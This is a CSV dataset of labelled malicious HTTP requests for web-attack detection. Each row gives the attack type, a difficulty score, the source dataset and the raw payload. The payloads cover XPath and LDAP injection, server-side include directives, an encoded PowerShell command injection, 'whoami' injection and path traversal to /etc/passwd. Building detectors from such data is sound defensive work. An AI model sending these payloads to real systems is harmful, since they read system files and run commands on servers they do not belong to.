attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
XPath Injection,medium,3.5,malicious,"POST /eanCunm/stfen/zV2h8hZBcjUm/c4NIIh-zk/sinb1xnG63Reec/tD/tFKhjGoP3q/fK2UWOzXXpbF/f2A5kk/DensUoteruxaR4g/ieiseltneoh/simtiveeqrsH.nsf? HTTP/1.0
Content-Length: 313
Content-Language: 5
Content-Encoding: compress
Content-Location: http://www.eneh.biz/gnsec/gIs0iUf/sagshtpv/hOrAsqo/miuorh.asp
Content-MD5: RGVhcGVmdW1yc2VhYWdlZA==
Content-Type: application/x-www-form-urlencoded
Expires: Wed, 28 Jul 04 17:58:10 UTC
Last-Modified: Wed, 12 Sep 07 06:52:20 GMT
Host: www.anntp.de
Connection: 6lnrer
Accept: */*
Accept-Charset: iso-8859-7, isiri-3342
Accept-Encoding: *;q=0.8
Accept-Language: *
Cache-Control: max-stale
Date: Sun, 14 Mar 04 20:37:27 CET
Expect: n4hotni
If-Modified-Since: Mon, 29 Jun 09 21:17:12 GMT
If-Unmodified-Since: Mon, 18 Jul 05 18:38:03 CET
If-Range: ""FgdN5eUc4Q-yS@HkQ""
Max-Forwards: 0720
Pragma: odde=rt1mros
Proxy-Authorization: Basic ZkxpYW86bXR5OWh1Mg==
Referer: http://www.ee8EtAlt.de/sgrtc/8ewf/heme/dwuhuze.php4
User-Agent: fiwlhTnt6e (nPe5os; ebDaChPj; sxigH-Z; u6Flij; fpsENi)
UA-CPU: Sparc
UA-Color: color16
UA-Pixels: 101x5961
Via: 8.2 86.63.40.232
Warning: 503 www.2ereIoft.tiff ""stHrxpgsdfyTd3soor"" 

ks9hes=4904186&aismudnt=tOBXfaYa&9ezaoitnlwnueoh=lfniBw&Qr4KVSWy5zE=003798&es=LHivg']   |     P  |   //user[ name/text(  )   =    'hlttA&6G48VfAMKdN=7777087&oQbGj4lcK6b9=538498&vdonbt5w1ls4re=scroalleey4objectosdu&dJ2htent9os7ps=lL<aent5uagogeeuunionia&veah8hdaracFbc6=wimg&fUARexec=yw02",35567,1457,xml_test-35567,pkdd,
Command Injection,medium,,malicious,"GET /cgi-bin/test?host=; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA HTTP/1.1
Host: app.local
User-Agent: Mozilla/5.0
Accept: */*
Connection: close

",,0,kaggle-cmdi-014,KaggleWebPayloads,; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA
SSI,medium,4.5,malicious,"GET /iMgkYCRfFzBe/jntieSfnteahtdsndhzW/uvpirdery9fhtzta/wBvIXWhB9gel/e1olz/OftqhtyduwrjonT/i4757l/d5KxfKBfdID_S@i.mspx?rs=sOi&AbrN041n4iy=htjpautoexecm%29oi&fperlimQVT=1543705&-7e5Oc21N=gj%40cRrkZ&wsegsvem=oRnzHlerDG9&genhIEiLiOeaths=sIXPH-tc&eMvo=xus HTTP/1.0
Host: 40.141.152.44
Connection: close
Accept: */*;q=0.0
Accept-Charset: *
Accept-Language: <!--    #include virtual=""/etc/httpd/httpd.conf""  -->
Cache-Control: no-cache
Client-ip: 123.53.218.168
Cookie: Hftpg5bjX=systemps%le;O9lwgjalweea=trb;3taairtru=hfRAeYsqodj64oie;hAru0pAm=so;dlmkigln= 
Date: Thu, 14 Sep 06 10:24:56 GMT
Expect: hnSfan
Max-Forwards: 962
Referer: /srFe/tkCde/sstde/rydssns.rar
Trailer: Date
User-Agent: hOtqef2OR http://www.iosumhh.be
Transfer-Encoding: deflate
Upgrade: sysfnd/5.6",39513,779,xml_test-39513,pkdd,
Path Traversal,medium,,malicious,"POST /api/items HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Connection: close

comment=%252e%252e%252f/etc/passwd%00index.html&id=2036",,222,patt-path-traversal-1036,PayloadsAllTheThings,%252e%252e%252f/etc/passwd%00index.html
LDAP Injection,medium,,malicious,"POST /profile HTTP/1.1
Host: demo.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Connection: close

path=Can be used in an injection like `*)(ATTRIBUTE_HERE=*&id=1134",,222,patt-ldap-injection-0134,PayloadsAllTheThings,Can be used in an injection like `*)(ATTRIBUTE_HERE=*
SSI,medium,4.0,malicious,"POST /3Kr9d/elshlQ/O@jgiwscriptwnulln/qcaDobjectl/uOceoartou9se/hq7NlEdg5Va/connectHTNPG4CJimgAFfE/enwsr.shtml? HTTP/1.0
Content-Length: 16
Content-Language: 1etot6,aibl
Content-Encoding: deflate
Content-Location: http://Ehflbnro.gov/1iiptk/pTrtfn/tn0rAd.nsf
Content-MD5: bjZtZWVlaEtoZU5iaTU4dA==
Content-Type: application/x-www-form-urlencoded
Expires: Tue, 25 Dec 07 17:15:41 UTC
Last-Modified: Wed, 21 Nov 07 18:11:12 CET
Host: 62.107.118.255
Connection: close
Accept: video/mpeg;q=0.9
Accept-Charset: hz-gb-2312;q=0.9, utf-7
Accept-Encoding: *
Accept-Language: *;q=0.3
Cache-Control: min-fresh=4
Cookie: o3lnaohdtmIhte=h9TqmTid1o;trrns=d;sEdjp5ho=a yay
Date: Fri, 04 Dec 09 08:12:06 GMT
From: IxNddnw@esbte.net
If-Modified-Since: Fri, 23 Jun 06 18:45:41 GMT
If-Unmodified-Since: Wed, 07 Oct 09 17:13:33 GMT
If-Match: ""BWWZfCi_DLDM0@TW""
If-None-Match: *
Max-Forwards: 892
Pragma: no-cache
Range: -05
Referer: http://www.trnop.cz/r9o12Gn/rhhClti4/mtSi/2tnc.htm
TE: gzip,trailers
User-Agent: <!--   #include   virtual=""/var/log/httpd/access.log""     -->
UA-Color: color32
Warning: 290 144.167.27.105:99939 ""faiwmhn2Lliv1gynD"" ""Thu, 27 Dec 07 16:10:00 GMT""
X-Serial-Number: 39752722900840058
~~~~~: ~~~~~~~~~~~~~~~

egyegsH=of2IGulZ",39841,1266,xml_test-39841,pkdd,
Command Injection,medium,,malicious,"GET /auth?search="" || whoami HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Accept: */*
Connection: close",,112,patt-command-injection-0912,PayloadsAllTheThings,""" || whoami"
LDAP Injection,medium,,malicious,"POST /search HTTP/1.1
Host: intranet.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: close

path=(&(sn=administrator)(password=MB*)) : KO&id=1118",,222,patt-ldap-injection-0118,PayloadsAllTheThings,(&(sn=administrator)(password=MB*)) : KO
Path Traversal,medium,4.0,malicious,"GET /error/\..\..\..\..\winnt\win.ini? HTTP/1.1
Host: 39.100.201.70
Connection: keep-alive
Accept: application/*, video/*, text/*;q=0.6
Accept-Charset: *
Accept-Encoding: 
Accept-Language: *
Cache-Control: no-cache
Client-ip: 189.4.113.141
Cookie2: $Version=""3""
Date: Sun, 13 Jan 08 24:05:43 UTC
Expect: 100-continue
If-Modified-Since: Fri, 18 Jun 04 21:07:23 UTC
If-Match: ""BL6_@8kSIXD9@TvuYy""
If-None-Match: *
If-Range: ""8XV@_2tDEk.7skyj.Qd""
Max-Forwards: 4923
Pragma: no-cache
Authorization: Basic ZGRhaGVlbTo4c3RlaA==
Referer: http://www.etNtxAs1.cz/seH9hi/d8ekee/i17pa.sh
TE: trailers,trailers,gzip
Trailer: Accept-Language
User-Agent: Mozilla/9.6 (X11; U; Solaris 0.9; et-85; rv:9.4.6) Gecko/50801753
Via: 1.7 www.sqetltr.jpg, 5.3 www.borc.jpg:33
Upgrade: sst2oo/6.7, eatt/1.0",36206,806,xml_test-36206,pkdd,
XPath Injection,medium,,malicious,"POST /profile HTTP/1.1
Host: intranet.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
Connection: close

name=substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)&id=1393",,254,patt-xpath-injection-0393,PayloadsAllTheThings,"substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)"
